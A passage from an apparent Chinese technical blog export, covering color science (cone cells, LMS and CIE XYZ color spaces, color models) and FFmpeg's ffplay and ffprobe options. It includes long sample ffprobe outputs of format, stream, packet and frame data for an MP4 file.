<li>人类可见光谱的波长范围在[380~750nm]<img data-src="/images/Media/human-eye-cells.jpg" class="" width="420" height="280" title="Human eye cells"></li>
<li>人眼内有三种视锥细胞（cone cell）在白昼环境下是颜色感知的基础，其中rho受体对长波长（L, red&#x2F;600nm附近）较敏感，gamma受体对中波长（M, green&#x2F;550nm附近）较敏感，beta受体对短波长（S, blue&#x2F;450nm附近）较敏感；另一种视杆细胞（rod cell），是单色的“夜视”受体，在夜晚环境中变得活跃；</li>
<li>人眼对光谱的敏感度与光照条件有关，主要受入射光亮（incoming luminance）影响，当光亮值（luminance value）低于 $10^{-3} cd&#x2F;m^2$ 时，为单色的夜间视觉（scotopic vision），高于几个cd&#x2F;m2时，才是良好的白昼视觉（photopic vision）。另外，随着人眼的老化，短波成分更容易出现吸收（absorption）和散射（scattering）损失。</li>
<li>发光效率函数（luminous efficiency function）用来表示在固定的辐射率（radiance）条件下，不同波长的光产生的亮度（brightness）情况。当白昼（photopic）时，峰值出现在555nm附近，因此在电能到光通量的转换效率上，白光因为包含红和蓝光成分，其发光效率也是不如绿光的。对于夜间光亮函数，其峰值在507nm，由于视锥细胞不能提供足够强的信号，已无法感知到颜色。<img data-src="/images/Media/photopic-luminosity-efficiency-function.webp" class="" width="640" height="320" title="1924 photopic luminous efficiency function.">
<img data-src="/images/Media/scotopic-luminosity-efficiency-function.webp" class="" width="640" height="320" title="1951 scotopic luminous efficiency function."></li>
<li>三原色匹配函数（trichromatic matching functions）用来描述三原色（选定的三个波长的光）混合成某个波长的光颜色时，需要提供的三个原色的光的量（luminance），此函数由实验数据绘制。<img data-src="/images/Media/maxwell-color-matching-experiment.jpg" class="" width="854" height="554" title="color matching experiment by Maxwell">
<ul>
<li>Target Color：想要合成的目标波长（555nm）的颜色</li>
<li>Color Match：三原色根据匹配函数合成的结果颜色</li>
<li>Primaries: 选定的三原色波长以及合成目标波长颜色时各自的取值</li>
<li>负值情况：选定的三原色只能合成出大部分可见光波长的颜色，遇到无法合成的波长时，可以在目标颜色中混入相近的参考色（或光源）以实现完全匹配，此时的参考色换算到三原色分量上后，导致三原色出现负值。</li>
</ul>
</li>
</ul>
<h3 id="LMS色彩空间"><a href="#LMS色彩空间" class="headerlink" title="LMS色彩空间"></a>LMS色彩空间</h3><p><a href="http://cvrl.ioo.ucl.ac.uk/ciepr.htm">Colour &amp; Vision Research Laboratory of the University College London, page on CIE 2006 physiologically-relevant LMS functions</a></p>
<ul>
<li>三色灵敏度函数（tristimulus sensitivity functions）是以波长作为X轴（单位：nm），标准化后（使得峰值一致）的视锥细胞相对灵敏度作为Y轴进行绘制的，三个函数中灵敏度峰值处的波长作为三原色选定的光。<img data-src="/images/Media/tristimulus-sensitivity-functions-cone-cells.png" class="" width="480" height="320" title="tristimulus sensitivity functions of cone cells"></li>
<li>由于三原色（trichromatic）刺激过程是有损的，不同的光谱分布（spectral distribution）可能以完全相同的方式刺激视锥细胞，所以不能从视锥细胞的灵敏度输出反向推断出原始的光谱分布。也正因为此，只要能创造出与原始光谱分布产生相同刺激的光谱分布，就可以再现一种颜色，即彩色屏幕发光的原理。</li>
<li>光谱颜色轨迹（locus of spectral colors）：用rho、gamma、beta分别表示三种视锥细胞的敏感程度，依次为轴建立三维坐标系，将三色灵敏度函数上的点绘制到此坐标系中形成的轨迹。</li>
<li>LMS颜色空间（Three-dimensional colorspace）是将三色灵敏度函数所包围的点全部绘制到rho-gamma-beta三维空间中形成的立体空间，空间中的某个位置表示一个特定颜色的物体对三种视锥细胞的刺激程度，例如深红色物体只在rho轴上。原点位置为人类看不到的波长，例如红外线和紫外线。由于三种视锥细胞的光谱灵敏度曲线重叠，大多数波长都能同时刺激两种或三种视锥细胞，因此LMS空间并非简单的立方体，一些组合在物理上是不可能的，例如M非0、L和S为0的组合；<img data-src="/images/Media/LMS-Color-Space.png" class="" width="720" height="480" title="LMS color space"></li>
<li>RGB色域（gamut）：在光谱颜色轨迹中将选定的三原色波长对应的点连成一个三角形，颜色空间在此三角形上的投影即为色域，表示三原色能合成出的所有颜色范围。<img data-src="/images/Media/RGB-gamut.jpg" class="" width="596" height="582" title="RGB gamut"></li>
<li>RGB色度图（chromaticity diagram）：以三原色RGB为轴重新建立三维坐标系，使得三原色的波长点均位于轴上，然后将rho-gamma-beta坐标系中的LMS颜色空间换算到RGB三维坐标系中得到RGB颜色空间，将此空间的所有点投影到三原色形成的平面上(R+G+B&#x3D;1)得到投影图。因为平面可以用二维坐标表示，将B&#x3D;1处作为二维坐标的原点，两个新轴分别为r和g，重新绘制投影图后即为色度图。<img data-src="/images/Media/RGB-chromaticity-diagram.jpg" class="" width="648" height="437" title="RGB chromaticity diagram">
<ul>
<li>RGB色度图缺点：<ul>
<li>大多数沿光谱颜色轨迹的颜色需要负的r和g值表示；</li>
<li>光谱颜色轨迹的形状取决于三原色的选定</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="XYZ色彩空间"><a href="#XYZ色彩空间" class="headerlink" title="XYZ色彩空间"></a>XYZ色彩空间</h3><p><a href="http://www.cvrl.org/ciexyzpr.htm">Colour &amp; Vision Research Laboratory of the University College London, page on CIE XYZ functions.</a></p>
<ul>
<li>1931年由CIE (International Commission on Illumination) 定义，是一个标准的颜色空间，独立于任何三原色的选择，这使得不同行业的人可以精确的讨论颜色。其中，Y表示亮度（luminance），Z近似于blue（CIE&#x2F;RGB），X是CIE&#x2F;RGB中三种曲线非负部分的混合。<img data-src="/images/Media/CIE1931_XYZ_Color_Matching_Functions.svg" class="" width="480" height="320" title="The CIE XYZ color matching functions for a 2-degree field."></li>
<li>XYZ色度图中的白点位于(x,y) &#x3D; (1&#x2F;3, 1&#x2F;3)处。<img data-src="/images/Media/XYZ-chromaticity-diagram.jpg" class="" width="597" height="433" title="XYZ chromaticity diagram"></li>
</ul>
<h2 id="加减色模型"><a href="#加减色模型" class="headerlink" title="加减色模型"></a>加减色模型</h2><h3 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h3><p>RGB (red, green, blue) 是加色模型（Additive models），用于计算机视觉中。</p>
<h3 id="CMYK"><a href="#CMYK" class="headerlink" title="CMYK"></a>CMYK</h3><p>CMYK (cyan, magenta, yellow, black) 是减色模型（subtractive models），用于彩色印刷中。</p>
<h2 id="柱面坐标模型"><a href="#柱面坐标模型" class="headerlink" title="柱面坐标模型"></a>柱面坐标模型</h2><p>柱面坐标模型（Cylindrical-coordinate color models）<br>HSL (hue, saturation, lightness)<br>HSV (hue, saturation, brightness) </p>
]]></content>
      <categories>
        <category>Media</category>
      </categories>
      <tags>
        <tag>ColorTheory</tag>
      </tags>
  </entry>
  <entry>
    <title>FFmpeg视频处理</title>
    <url>/Media/FFmpeg.html</url>
    <content><![CDATA[<p>FFmpeg功能梳理。</p>
<span id="more"></span>

<h1 id="ffplay"><a href="#ffplay" class="headerlink" title="ffplay"></a>ffplay</h1><p><a href="https://ffmpeg.org/ffplay-all.html">ffplay Documentation</a></p>
<ul>
<li><code>-x 800</code> 窗口宽</li>
<li><code>-y 600</code> 窗口高</li>
<li><code>-left 100</code> 窗口位置距离左边100像素</li>
<li><code>-top 100</code> 窗口位置距离顶部100像素</li>
<li><code>-an</code> 禁用音频</li>
<li><code>-vn</code> 禁用视频</li>
<li><code>-sn</code> 禁用字幕</li>
<li><code>-ss 60</code> 跳转到60s位置</li>
<li><code>-t 30</code> 播放30s</li>
<li><code>-seek_interval 10</code> 播放过程中左右方向键跳转间隔为10s(默认)</li>
<li><code>-volume 50</code> 播放音量为50（0~100）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">While playing:</span><br><span class="line">q, ESC              quit</span><br><span class="line">f                   toggle full screen</span><br><span class="line">p, SPC              pause</span><br><span class="line">space               toggle pause</span><br><span class="line">m                   toggle mute</span><br><span class="line">9, 0                decrease and increase volume respectively</span><br><span class="line">/, *                decrease and increase volume respectively</span><br><span class="line">a                   cycle audio channel in the current program</span><br><span class="line">v                   cycle video channel</span><br><span class="line">t                   cycle subtitle channel in the current program</span><br><span class="line">c                   cycle program</span><br><span class="line">w                   cycle video filters or show modes</span><br><span class="line">s                   activate frame-step mode</span><br><span class="line">left/right          seek backward/forward 10 seconds (set by -seek_interval)</span><br><span class="line">down/up             seek backward/forward 1 minute</span><br><span class="line">page down/page up   seek backward/forward 10 minutes</span><br><span class="line">right mouse click   seek to percentage in file corresponding to fraction of width</span><br><span class="line">left double-click   toggle full screen</span><br></pre></td></tr></table></figure>

<h1 id="ffprobe"><a href="#ffprobe" class="headerlink" title="ffprobe"></a>ffprobe</h1><p><a href="https://ffmpeg.org/ffprobe-all.html">ffprobe Documentation</a></p>
<ul>
<li><code>-v error</code> 设置日志输出级别（info, warning, error）</li>
<li><code>-of, -print_format json</code> 设置输出格式为json<ul>
<li><code>-of default=nokey=1:noprint_wrappers=1 (简写为nk=1:nw=1)</code> 只输出值（去掉key和section标识）</li>
</ul>
</li>
<li><code>-show_format</code> 显示封装信息</li>
<li><code>-show_streams</code> 显示流信息<ul>
<li><code>-select_streams v:0</code> 选择第一条视频流（a音频，v视频，s字幕）</li>
</ul>
</li>
<li><code>-show_packets</code> 显示数据包信息</li>
<li><code>-show_frames</code> 显示解码后的帧信息</li>
<li><code>-show_entries format=start_time:stream=width,height</code> 过滤输出结果</li>
<li><code>-read_intervals %+20</code> 只读前20s<ul>
<li><code>-read_intervals %02:30</code> 只读到<code>02:30</code>位置</li>
<li><code>-read_intervals 01:23%+#42</code> 跳转到<code>01:23</code>位置后只读42个包</li>
<li><code>-read_intervals 10%+20,01:30%01:45</code> 跳转到10s位置后读20s，然后再跳转到<code>01:30</code>位置后读到<code>01:45</code>位置</li>
</ul>
</li>
</ul>
<div class="tabs" id="ffprobe-basic"><ul class="nav-tabs"><li class="tab active"><a href="#ffprobe-basic-1">-v info</a></li><li class="tab"><a href="#ffprobe-basic-2">-show_format</a></li><li class="tab"><a href="#ffprobe-basic-3">-show_streams</a></li><li class="tab"><a href="#ffprobe-basic-4">-show_packets</a></li><li class="tab"><a href="#ffprobe-basic-5">-show_frames</a></li></ul><div class="tab-content"><div class="tab-pane active" id="ffprobe-basic-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input #0, mov,mp4,m4a,3gp,3g2,mj2, from &#x27;1.mp4&#x27;:</span><br><span class="line">  Metadata:</span><br><span class="line">    major_brand     : isom</span><br><span class="line">    minor_version   : 512</span><br><span class="line">    compatible_brands: isomiso2avc1mp41</span><br><span class="line">    encoder         : Lavf58.29.100</span><br><span class="line">  Duration: 00:01:01.04, start: 0.000000, bitrate: 10285 kb/s</span><br><span class="line">    Stream #0:0(und): Video: h264 (High) (avc1 / 0x31637661), yuv420p(tv, bt709), 1920x1080 [SAR 1:1 DAR 16:9], 10020 kb/s, 60 fps, 60 tbr, 90k tbn, 120 tbc (default)</span><br><span class="line">    Metadata:</span><br><span class="line">      handler_name    : VideoHandler</span><br><span class="line">    Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 48000 Hz, stereo, fltp, 256 kb/s (default)</span><br><span class="line">    Metadata:</span><br><span class="line">      handler_name    : SoundHandler</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="ffprobe-basic-2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[FORMAT]</span><br><span class="line">filename=1.mp4</span><br><span class="line">nb_streams=2</span><br><span class="line">nb_programs=0</span><br><span class="line">format_name=mov,mp4,m4a,3gp,3g2,mj2</span><br><span class="line">format_long_name=QuickTime / MOV</span><br><span class="line">start_time=0:00:00.000000</span><br><span class="line">duration=0:01:01.035000</span><br><span class="line">size=74.837353 Mibyte</span><br><span class="line">bit_rate=10.285593 Mbit/s</span><br><span class="line">probe_score=100</span><br><span class="line">TAG:major_brand=isom</span><br><span class="line">TAG:minor_version=512</span><br><span class="line">TAG:compatible_brands=isomiso2avc1mp41</span><br><span class="line">TAG:encoder=Lavf58.29.100</span><br><span class="line">[/FORMAT]</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="ffprobe-basic-3"><table>
  <tr>
    <td>video</td>
    <td>audio</td>
  </tr>
  <tr>
    <td valign="top">
    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[STREAM]</span><br><span class="line">index=0</span><br><span class="line">codec_name=h264</span><br><span class="line">codec_long_name=H.264 / AVC / MPEG-4 part 10</span><br><span class="line">profile=High</span><br><span class="line">codec_type=video</span><br><span class="line">codec_time_base=182999/21960000</span><br><span class="line">codec_tag_string=avc1</span><br><span class="line">codec_tag=0x31637661</span><br><span class="line">width=1920</span><br><span class="line">height=1080</span><br><span class="line">coded_width=1920</span><br><span class="line">coded_height=1088</span><br><span class="line">has_b_frames=1</span><br><span class="line">sample_aspect_ratio=1:1</span><br><span class="line">display_aspect_ratio=16:9</span><br><span class="line">pix_fmt=yuv420p</span><br><span class="line">level=42</span><br><span class="line">color_range=tv</span><br><span class="line">color_space=bt709</span><br><span class="line">color_transfer=bt709</span><br><span class="line">color_primaries=bt709</span><br><span class="line">chroma_location=left</span><br><span class="line">field_order=unknown</span><br><span class="line">timecode=N/A</span><br><span class="line">refs=1</span><br><span class="line">is_avc=true</span><br><span class="line">nal_length_size=4</span><br><span class="line">id=N/A</span><br><span class="line">r_frame_rate=60/1</span><br><span class="line">avg_frame_rate=10980000/182999</span><br><span class="line">time_base=1/90000</span><br><span class="line">start_pts=0</span><br><span class="line">start_time=0:00:00.000000</span><br><span class="line">duration_ts=5401440</span><br><span class="line">duration=0:01:00.016000</span><br><span class="line">bit_rate=10.020903 Mbit/s</span><br><span class="line">max_bit_rate=N/A</span><br><span class="line">bits_per_raw_sample=8</span><br><span class="line">nb_frames=3660</span><br><span class="line">nb_read_frames=N/A</span><br><span class="line">nb_read_packets=N/A</span><br><span class="line">DISPOSITION:default=1</span><br><span class="line">DISPOSITION:dub=0</span><br><span class="line">DISPOSITION:original=0</span><br><span class="line">DISPOSITION:comment=0</span><br><span class="line">DISPOSITION:lyrics=0</span><br><span class="line">DISPOSITION:karaoke=0</span><br><span class="line">DISPOSITION:forced=0</span><br><span class="line">DISPOSITION:hearing_impaired=0</span><br><span class="line">DISPOSITION:visual_impaired=0</span><br><span class="line">DISPOSITION:clean_effects=0</span><br><span class="line">DISPOSITION:attached_pic=0</span><br><span class="line">DISPOSITION:timed_thumbnails=0</span><br><span class="line">TAG:language=und</span><br><span class="line">TAG:handler_name=VideoHandler</span><br><span class="line">[/STREAM]</span><br></pre></td></tr></table></figure>
    </td>
    <td valign="top">
    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[STREAM]</span><br><span class="line">index=1</span><br><span class="line">codec_name=aac</span><br><span class="line">codec_long_name=Advanced Audio Coding</span><br><span class="line">profile=LC</span><br><span class="line">codec_type=audio</span><br><span class="line">codec_time_base=1/48000</span><br><span class="line">codec_tag_string=mp4a</span><br><span class="line">codec_tag=0x6134706d</span><br><span class="line">sample_fmt=fltp</span><br><span class="line">sample_rate=48 KHz</span><br><span class="line">channels=2</span><br><span class="line">channel_layout=stereo</span><br><span class="line">bits_per_sample=0</span><br><span class="line">id=N/A</span><br><span class="line">r_frame_rate=0/0</span><br><span class="line">avg_frame_rate=0/0</span><br><span class="line">time_base=1/48000</span><br><span class="line">start_pts=0</span><br><span class="line">start_time=0:00:00.000000</span><br><span class="line">duration_ts=2880672</span><br><span class="line">duration=0:01:00.014000</span><br><span class="line">bit_rate=256.225000 Kbit/s</span><br><span class="line">max_bit_rate=256.225000 Kbit/s</span><br><span class="line">bits_per_raw_sample=N/A</span><br><span class="line">nb_frames=2861</span><br><span class="line">nb_read_frames=N/A</span><br><span class="line">nb_read_packets=N/A</span><br><span class="line">DISPOSITION:default=1</span><br><span class="line">DISPOSITION:dub=0</span><br><span class="line">DISPOSITION:original=0</span><br><span class="line">DISPOSITION:comment=0</span><br><span class="line">DISPOSITION:lyrics=0</span><br><span class="line">DISPOSITION:karaoke=0</span><br><span class="line">DISPOSITION:forced=0</span><br><span class="line">DISPOSITION:hearing_impaired=0</span><br><span class="line">DISPOSITION:visual_impaired=0</span><br><span class="line">DISPOSITION:clean_effects=0</span><br><span class="line">DISPOSITION:attached_pic=0</span><br><span class="line">DISPOSITION:timed_thumbnails=0</span><br><span class="line">TAG:language=und</span><br><span class="line">TAG:handler_name=SoundHandler</span><br><span class="line">[/STREAM]</span><br></pre></td></tr></table></figure>
    </td>
  </tr>
</table></div><div class="tab-pane" id="ffprobe-basic-4"><table>
  <tr>
    <td>video (-select_streams v:0)</td>
    <td>audio (-select_streams a)</td>
  </tr>
  <tr>
    <td valign="top">
    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[PACKET]</span><br><span class="line">codec_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">pts=-88560</span><br><span class="line">pts_time=0:00:-0.984000</span><br><span class="line">dts=-90000</span><br><span class="line">dts_time=0:00:-1.000000</span><br><span class="line">duration=1500</span><br><span class="line">duration_time=0:00:00.016667</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=277.997070 Kibyte</span><br><span class="line">pos=784</span><br><span class="line">flags=KD</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">pts=-83970</span><br><span class="line">pts_time=0:00:-0.933000</span><br><span class="line">dts=-88470</span><br><span class="line">dts_time=0:00:-0.983000</span><br><span class="line">duration=1500</span><br><span class="line">duration_time=0:00:00.016667</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=30.319336 Kibyte</span><br><span class="line">pos=286161</span><br><span class="line">flags=_D</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">pts=-87030</span><br><span class="line">pts_time=0:00:-0.967000</span><br><span class="line">dts=-87030</span><br><span class="line">dts_time=0:00:-0.967000</span><br><span class="line">duration=1500</span><br><span class="line">duration_time=0:00:00.016667</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=7.679688 Kibyte</span><br><span class="line">pos=317893</span><br><span class="line">flags=_D</span><br><span class="line">[/PACKET]</span><br><span class="line">...</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">pts=5395500</span><br><span class="line">pts_time=0:00:59.950000</span><br><span class="line">dts=5395500</span><br><span class="line">dts_time=0:00:59.950000</span><br><span class="line">duration=1500</span><br><span class="line">duration_time=0:00:00.016667</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=9.243164 Kibyte</span><br><span class="line">pos=78309869</span><br><span class="line">flags=__</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">pts=5401530</span><br><span class="line">pts_time=0:01:00.017000</span><br><span class="line">dts=5397030</span><br><span class="line">dts_time=0:00:59.967000</span><br><span class="line">duration=1500</span><br><span class="line">duration_time=0:00:00.016667</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=33.048828 Kibyte</span><br><span class="line">pos=78320073</span><br><span class="line">flags=_D</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">pts=5398470</span><br><span class="line">pts_time=0:00:59.983000</span><br><span class="line">dts=5398470</span><br><span class="line">dts_time=0:00:59.983000</span><br><span class="line">duration=1500</span><br><span class="line">duration_time=0:00:00.016667</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=8.390625 Kibyte</span><br><span class="line">pos=78354609</span><br><span class="line">flags=__</span><br><span class="line">[/PACKET]</span><br></pre></td></tr></table></figure>
    </td>
    <td valign="top">
    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[PACKET]</span><br><span class="line">codec_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">pts=-48976</span><br><span class="line">pts_time=0:00:-1.020333</span><br><span class="line">dts=-48976</span><br><span class="line">dts_time=0:00:-1.020333</span><br><span class="line">duration=1024</span><br><span class="line">duration_time=0:00:00.021333</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=736 byte</span><br><span class="line">pos=48</span><br><span class="line">flags=KD</span><br><span class="line">[SIDE_DATA]</span><br><span class="line">side_data_type=Skip Samples</span><br><span class="line">skip_samples=48976</span><br><span class="line">discard_padding=0</span><br><span class="line">skip_reason=0</span><br><span class="line">discard_reason=0</span><br><span class="line">[/SIDE_DATA]</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">pts=-47952</span><br><span class="line">pts_time=0:00:-0.999000</span><br><span class="line">dts=-47952</span><br><span class="line">dts_time=0:00:-0.999000</span><br><span class="line">duration=1024</span><br><span class="line">duration_time=0:00:00.021333</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=708 byte</span><br><span class="line">pos=285453</span><br><span class="line">flags=KD</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">pts=-46928</span><br><span class="line">pts_time=0:00:-0.977667</span><br><span class="line">dts=-46928</span><br><span class="line">dts_time=0:00:-0.977667</span><br><span class="line">duration=1024</span><br><span class="line">duration_time=0:00:00.021333</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=685 byte</span><br><span class="line">pos=317208</span><br><span class="line">flags=KD</span><br><span class="line">[/PACKET]</span><br><span class="line">...</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">pts=2877616</span><br><span class="line">pts_time=0:00:59.950333</span><br><span class="line">dts=2877616</span><br><span class="line">dts_time=0:00:59.950333</span><br><span class="line">duration=1024</span><br><span class="line">duration_time=0:00:00.021333</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=739 byte</span><br><span class="line">pos=78319334</span><br><span class="line">flags=K_</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">pts=2878640</span><br><span class="line">pts_time=0:00:59.971667</span><br><span class="line">dts=2878640</span><br><span class="line">dts_time=0:00:59.971667</span><br><span class="line">duration=1024</span><br><span class="line">duration_time=0:00:00.021333</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=694 byte</span><br><span class="line">pos=78353915</span><br><span class="line">flags=K_</span><br><span class="line">[/PACKET]</span><br><span class="line">[PACKET]</span><br><span class="line">codec_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">pts=2879664</span><br><span class="line">pts_time=0:00:59.993000</span><br><span class="line">dts=2879664</span><br><span class="line">dts_time=0:00:59.993000</span><br><span class="line">duration=1008</span><br><span class="line">duration_time=0:00:00.021000</span><br><span class="line">convergence_duration=N/A</span><br><span class="line">convergence_duration_time=N/A</span><br><span class="line">size=646 byte</span><br><span class="line">pos=78363201</span><br><span class="line">flags=K_</span><br><span class="line">[/PACKET]</span><br></pre></td></tr></table></figure>
    </td>
  </tr>
</table></div><div class="tab-pane" id="ffprobe-basic-5"><table>
  <tr>
    <td>video (-select_streams v:0)</td>
    <td>audio (-select_streams a)</td>
  </tr>
  <tr>
    <td valign="top">
    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[FRAME]</span><br><span class="line">media_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">key_frame=0</span><br><span class="line">pkt_pts=0</span><br><span class="line">pkt_pts_time=0:00:00.000000</span><br><span class="line">pkt_dts=0</span><br><span class="line">pkt_dts_time=0:00:00.000000</span><br><span class="line">best_effort_timestamp=0</span><br><span class="line">best_effort_timestamp_time=0:00:00.000000</span><br><span class="line">pkt_duration=1500</span><br><span class="line">pkt_duration_time=0:00:00.016667</span><br><span class="line">pkt_pos=1416588</span><br><span class="line">pkt_size=21.227539 Kibyte</span><br><span class="line">width=1920</span><br><span class="line">height=1080</span><br><span class="line">pix_fmt=yuv420p</span><br><span class="line">sample_aspect_ratio=1:1</span><br><span class="line">pict_type=B</span><br><span class="line">coded_picture_number=60</span><br><span class="line">display_picture_number=0</span><br><span class="line">interlaced_frame=0</span><br><span class="line">top_field_first=0</span><br><span class="line">repeat_pict=0</span><br><span class="line">color_range=tv</span><br><span class="line">color_space=bt709</span><br><span class="line">color_primaries=bt709</span><br><span class="line">color_transfer=bt709</span><br><span class="line">chroma_location=left</span><br><span class="line">[/FRAME]</span><br><span class="line">[FRAME]</span><br><span class="line">media_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">key_frame=0</span><br><span class="line">pkt_pts=1530</span><br><span class="line">pkt_pts_time=0:00:00.017000</span><br><span class="line">pkt_dts=1530</span><br><span class="line">pkt_dts_time=0:00:00.017000</span><br><span class="line">best_effort_timestamp=1530</span><br><span class="line">best_effort_timestamp_time=0:00:00.017000</span><br><span class="line">pkt_duration=1500</span><br><span class="line">pkt_duration_time=0:00:00.016667</span><br><span class="line">pkt_pos=1354937</span><br><span class="line">pkt_size=52.866211 Kibyte</span><br><span class="line">width=1920</span><br><span class="line">height=1080</span><br><span class="line">pix_fmt=yuv420p</span><br><span class="line">sample_aspect_ratio=1:1</span><br><span class="line">pict_type=P</span><br><span class="line">coded_picture_number=58</span><br><span class="line">display_picture_number=0</span><br><span class="line">interlaced_frame=0</span><br><span class="line">top_field_first=0</span><br><span class="line">repeat_pict=0</span><br><span class="line">color_range=tv</span><br><span class="line">color_space=bt709</span><br><span class="line">color_primaries=bt709</span><br><span class="line">color_transfer=bt709</span><br><span class="line">chroma_location=left</span><br><span class="line">[/FRAME]</span><br><span class="line">...</span><br><span class="line">[FRAME]</span><br><span class="line">media_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">key_frame=0</span><br><span class="line">pkt_pts=5397030</span><br><span class="line">pkt_pts_time=0:00:59.967000</span><br><span class="line">pkt_dts=5397030</span><br><span class="line">pkt_dts_time=0:00:59.967000</span><br><span class="line">best_effort_timestamp=5397030</span><br><span class="line">best_effort_timestamp_time=0:00:59.967000</span><br><span class="line">pkt_duration=1500</span><br><span class="line">pkt_duration_time=0:00:00.016667</span><br><span class="line">pkt_pos=78264694</span><br><span class="line">pkt_size=34.530273 Kibyte</span><br><span class="line">width=1920</span><br><span class="line">height=1080</span><br><span class="line">pix_fmt=yuv420p</span><br><span class="line">sample_aspect_ratio=1:1</span><br><span class="line">pict_type=P</span><br><span class="line">coded_picture_number=3655</span><br><span class="line">display_picture_number=0</span><br><span class="line">interlaced_frame=0</span><br><span class="line">top_field_first=0</span><br><span class="line">repeat_pict=0</span><br><span class="line">color_range=tv</span><br><span class="line">color_space=bt709</span><br><span class="line">color_primaries=bt709</span><br><span class="line">color_transfer=bt709</span><br><span class="line">chroma_location=left</span><br><span class="line">[/FRAME]</span><br><span class="line">[FRAME]</span><br><span class="line">media_type=video</span><br><span class="line">stream_index=0</span><br><span class="line">key_frame=0</span><br><span class="line">pkt_pts=5398470</span><br><span class="line">pkt_pts_time=0:00:59.983000</span><br><span class="line">pkt_dts=5398470</span><br><span class="line">pkt_dts_time=0:00:59.983000</span><br><span class="line">best_effort_timestamp=5398470</span><br><span class="line">best_effort_timestamp_time=0:00:59.983000</span><br><span class="line">pkt_duration=1500</span><br><span class="line">pkt_duration_time=0:00:00.016667</span><br><span class="line">pkt_pos=78354609</span><br><span class="line">pkt_size=8.390625 Kibyte</span><br><span class="line">width=1920</span><br><span class="line">height=1080</span><br><span class="line">pix_fmt=yuv420p</span><br><span class="line">sample_aspect_ratio=1:1</span><br><span class="line">pict_type=B</span><br><span class="line">coded_picture_number=3659</span><br><span class="line">display_picture_number=0</span><br><span class="line">interlaced_frame=0</span><br><span class="line">top_field_first=0</span><br><span class="line">repeat_pict=0</span><br><span class="line">color_range=tv</span><br><span class="line">color_space=bt709</span><br><span class="line">color_primaries=bt709</span><br><span class="line">color_transfer=bt709</span><br><span class="line">chroma_location=left</span><br><span class="line">[/FRAME]</span><br></pre></td></tr></table></figure>
    </td>
    <td valign="top">
    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[FRAME]</span><br><span class="line">media_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">key_frame=1</span><br><span class="line">pkt_pts=0</span><br><span class="line">pkt_pts_time=0:00:00.000000</span><br><span class="line">pkt_dts=0</span><br><span class="line">pkt_dts_time=0:00:00.000000</span><br><span class="line">best_effort_timestamp=-848</span><br><span class="line">best_effort_timestamp_time=0:00:-0.017667</span><br><span class="line">pkt_duration=176</span><br><span class="line">pkt_duration_time=0:00:00.003667</span><br><span class="line">pkt_pos=1409072</span><br><span class="line">pkt_size=662 byte</span><br><span class="line">sample_fmt=fltp</span><br><span class="line">nb_samples=176</span><br><span class="line">channels=2</span><br><span class="line">channel_layout=stereo</span><br><span class="line">[/FRAME]</span><br><span class="line">[FRAME]</span><br><span class="line">media_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">key_frame=1</span><br><span class="line">pkt_pts=176</span><br><span class="line">pkt_pts_time=0:00:00.003667</span><br><span class="line">pkt_dts=176</span><br><span 